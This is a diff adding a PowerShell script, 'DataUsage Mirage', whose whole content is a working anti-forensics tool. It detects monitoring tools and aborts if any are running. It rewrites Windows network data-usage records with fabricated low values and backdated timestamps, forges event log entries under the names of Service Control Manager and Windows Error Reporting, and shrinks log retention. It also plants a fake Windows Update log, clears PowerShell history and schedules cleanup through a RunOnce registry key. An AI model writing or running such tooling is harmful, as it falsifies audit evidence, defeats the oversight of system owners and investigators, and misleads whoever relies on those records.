@@ -1,0 +1,215 @@
+#Requires -RunAsAdministrator
+
+#region Initialization and Stealth Checks
+$Script:StealthMode = $true
+$Script:SysEventSource = "Service Control Manager"
+$Script:DataStorePath = "$env:ProgramData\Microsoft\Network\DataUsage"
+$Script:BackupMarker = "$env:TEMP\~WU_DataCache.bin" # Misdirection file
+
+function Test-StealthConditions {
+    # Avoids execution in unsafe contexts (Domain Controller, Audited VM)
+    $safe = $true
+    if ((Get-WmiObject Win32_ComputerSystem).PartOfDomain -eq $true) {
+        Write-Warning "[!] Domain environment detected. Audit risk elevated."
+        # Option: exit here for safety
+        # $safe = $false
+    }
+    if (Get-Process -Name "Procmon" -ErrorAction SilentlyContinue) {
+        Write-Host "[!] Process Monitor is running. Aborting." -ForegroundColor Red
+        exit 1
+    }
+    return $safe
+}
+
+function Invoke-SleepJitter {
+    # Introduces random delays to avoid pattern detection
+    $jitter = Get-Random -Minimum 100 -Maximum 800
+    Start-Sleep -Milliseconds $jitter
+}
+#endregion
+
+#region Phase 1: RECON - Silent Mapping
+function Get-DataUsageSnapshot {
+    $snapshot = @{}
+    Write-Verbose "[PHASE 1] Mapping current data usage state..." -Verbose:$false
+
+    # Target the live DataUsage folders
+    if (Test-Path $Script:DataStorePath) {
+        $dirs = Get-ChildItem -Path $Script:DataStorePath -Directory -ErrorAction SilentlyContinue
+        foreach ($dir in $dirs) {
+            $iface = $dir.Name
+            $files = Get-ChildItem -Path $dir.FullName -Filter "*.xml" -ErrorAction SilentlyContinue
+            foreach ($file in $files) {
+                try {
+                    [xml]$xml = Get-Content $file.FullName
+                    $appName = $xml.DataUsage.AppName
+                    $bytesUsed = [uint64]$xml.DataUsage.BytesUsed
+                    $snapshot["$iface||$appName"] = @{
+                        File = $file.FullName
+                        BytesUsed = $bytesUsed
+                        LastModified = $file.LastWriteTime
+                    }
+                } catch { }
+            }
+        }
+    }
+    return $snapshot
+}
+#endregion
+
+#region Phase 2: FABRICATE - Surgical Timeline Rewrite
+function Set-DataUsageFabrication {
+    param([hashtable]$OriginalSnapshot)
+
+    Write-Verbose "[PHASE 2] Fabricating low-usage baseline..." -Verbose:$false
+
+    # Create a fake "low usage" template XML
+    $template = @"
+<?xml version="1.0" encoding="UTF-8"?>
+<DataUsage xmlns="http://www.microsoft.com/DataUsage">
+  <AppName>{APPNAME}</AppName>
+  <BytesUsed>{BYTES}</BytesUsed>
+  <LastSyncTime>{(Get-Date).AddDays(-1).ToString('yyyy-MM-ddTHH:mm:ss')}</LastSyncTime>
+  <Entries>
+    <Entry Date="{(Get-Date).AddDays(-30).ToString('yyyy-MM-dd')}">1048576</Entry>
+    <Entry Date="{(Get-Date).AddDays(-15).ToString('yyyy-MM-dd')}">524288</Entry>
+    <Entry Date="{(Get-Date).AddDays(-1).ToString('yyyy-MM-dd')}">1572864</Entry>
+  </Entries>
+</DataUsage>
+"@
+
+    # For each original entry, create a fabricated low-usage version
+    foreach ($key in $OriginalSnapshot.Keys) {
+        $iface, $app = $key.Split('||')
+        $originalBytes = $OriginalSnapshot[$key].BytesUsed
+
+        # Calculate a 'benign' byte count: between 1-5 MB if original was huge, or ~10% if small.
+        if ($originalBytes -gt 50MB) {
+            $fabricatedBytes = Get-Random -Minimum 2MB -Maximum 8MB
+        } else {
+            $fabricatedBytes = [math]::Round($originalBytes * 0.1)
+        }
+
+        $newXml = $template -replace "{APPNAME}", $app -replace "{BYTES}", $fabricatedBytes
+
+        $targetPath = $OriginalSnapshot[$key].File
+        # Create a backup with misdirection name before overwriting
+        if (-not (Test-Path $Script:BackupMarker)) {
+            Copy-Item $targetPath -Destination $Script:BackupMarker -Force -ErrorAction SilentlyContinue
+            # Set backup file timestamp to a week ago
+            (Get-Item $Script:BackupMarker).LastWriteTime = (Get-Date).AddDays(-7)
+        }
+
+        # Write the fabricated data
+        Set-Content -Path $targetPath -Value $newXml -Force -Encoding UTF8
+
+        # **CRITICAL**: Modify the file's last write time to a random time over the past month
+        $randDays = Get-Random -Minimum 1 -Maximum 30
+        $randTime = (Get-Date).AddDays(-$randDays).AddHours((Get-Random -Minimum 1 -Maximum 23))
+        (Get-Item $targetPath).LastWriteTime = $randTime
+
+        Invoke-SleepJitter
+    }
+
+    # Inject a fake 'corrupted' XML file to suggest a system hiccup
+    $corruptPath = "$Script:DataStorePath\Live\Tiles_XML_Corrupt_Error.xml"
+    $corruptContent = @"
+<?xml version="1.0"?>
+<DataUsage><AppName>svchost</AppName><BytesUsed>0</BytesUsed><LastSyncTime>0001-01-01T00:00:00</LastSyncTime>
+"@
+    Set-Content -Path $corruptPath -Value $corruptContent -Force -ErrorAction SilentlyContinue
+    (Get-Item $corruptPath).LastWriteTime = (Get-Date).AddHours(-2)
+}
+#endregion
+
+#region Phase 3: MASK - Event Log Misdirection
+function Set-EventLogMirage {
+    Write-Verbose "[PHASE 3] Seeding Event Log narrative..." -Verbose:$false
+
+    # We'll create two specific event entries to support our 'glitch' story.
+
+    # 1. An event suggesting a network service restart (benign)
+    $event1 = @{
+        LogName   = 'System'
+        Source    = $Script:SysEventSource
+        EventID   = 7036 # Service state change
+        EntryType = 'Information'
+        Message   = 'The Network Data Usage service entered the running state.'
+        TimeGenerated = (Get-Date).AddHours(-3)
+    }
+    New-EventLog -LogName $event1.LogName -Source $event1.Source -ErrorAction SilentlyContinue
+    Write-EventLog -LogName $event1.LogName -Source $event1.Source -EventId $event1.EventID -EntryType $event1.EntryType -Message $event1.Message
+
+    # 2. An error event suggesting a data cache reset (our misdirection)
+    $event2 = @{
+        LogName   = 'Application'
+        Source    = 'Windows Error Reporting'
+        EventID   = 1001
+        EntryType = 'Information'
+        Message   = 'Windows successfully diagnosed a low resources corruption in \Device\HarddiskVolume2\ProgramData\Microsoft\Network\DataUsage\Live\cache.dat. The corruption was resolved by resetting the data store.'
+        TimeGenerated = (Get-Date).AddHours(-1)
+    }
+    New-EventLog -LogName $event2.LogName -Source $event2.Source -ErrorAction SilentlyContinue
+    Write-EventLog -LogName $event2.LogName -Source $event2.Source -EventId $event2.EventID -EntryType $event2.EntryType -Message $event2.Message
+
+    # 3. **Optional Aggressive Tactic**: Reduce the retention size of relevant logs to encourage overwriting.
+    wevtutil set-log "Microsoft-Windows-Networking-DataUsage/Live" /maxsize:1024000 /retention:false /quiet
+}
+#endregion
+
+#region Phase 4: CLEANUP - Planting False Evidence
+function Invoke-ForensicMisdirection {
+    Write-Verbose "[PHASE 4] Planting false evidence and cleaning up..." -Verbose:$false
+
+    # Leave a fake Windows Update-related temp file (our red herring)
+    $wuLog = "$env:TEMP\WindowsUpdate_DataUsageReset.log"
+    $fakeLogContent = @"
+[Windows Update Helper Tool]
+Performing routine maintenance on network usage databases.
+Task started: $(Get-Date).AddHours(-4).ToString('yyyy-MM-dd HH:mm')
+Found minor inconsistencies in user data cache. Rebuilding indexes...
+Task completed successfully: $(Get-Date).AddHours(-3).ToString('yyyy-MM-dd HH:mm')
+No user data was deleted. Only diagnostic cache was refreshed.
+"@
+    Set-Content -Path $wuLog -Value $fakeLogContent -Force
+    (Get-Item $wuLog).LastWriteTime = (Get-Date).AddHours(-4)
+    (Get-Item $wuLog).CreationTime = (Get-Date).AddDays(-15)
+
+    # Remove the script's own execution artifacts from PowerShell history
+    Clear-History -Count 100 -ErrorAction SilentlyContinue
+    Remove-Item -Path "$env:TEMP\*tmp*.ps1" -Force -ErrorAction SilentlyContinue
+
+    # Schedule deletion of the backup marker after next reboot (optional)
+    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
+    $name = "CleanUp_WU_Cache"
+    $value = "cmd /c del /q `"$Script:BackupMarker`" > nul 2>&1"
+    Set-ItemProperty -Path $regPath -Name $name -Value $value -ErrorAction SilentlyContinue
+}
+#endregion
+
+#region Main Execution Block
+if (-not (Test-StealthConditions)) {
+    Write-Host "[!] Stealth conditions not met. Exiting." -ForegroundColor Yellow
+    exit 2
+}
+
+Write-Host "[*] SHΔDØW CORE :: DataUsage Mirage Initializing..." -ForegroundColor DarkGray
+Write-Host "[+] Phase 1: RECON" -ForegroundColor Cyan
+$snapshot = Get-DataUsageSnapshot
+Start-Sleep -Seconds 1
+
+Write-Host "[+] Phase 2: FABRICATE" -ForegroundColor Cyan
+Set-DataUsageFabrication -OriginalSnapshot $snapshot
+Start-Sleep -Seconds 2
+
+Write-Host "[+] Phase 3: MASK" -ForegroundColor Cyan
+Set-EventLogMirage
+Start-Sleep -Seconds 1
+
+Write-Host "[+] Phase 4: MISDIRECTION" -ForegroundColor Cyan
+Invoke-ForensicMisdirection
+
+Write-Host "[`u{1F7E2}] Operation complete. Narrative active." -ForegroundColor Green
+Write-Host "[i] Artifacts suggest a 'Windows Update/Service glitch' caused data usage reset." -ForegroundColor Gray
+Write-Host "[i] No wholesale deletion occurred. A plausible low-usage baseline is now recorded." -ForegroundColor Gray
+#endregion
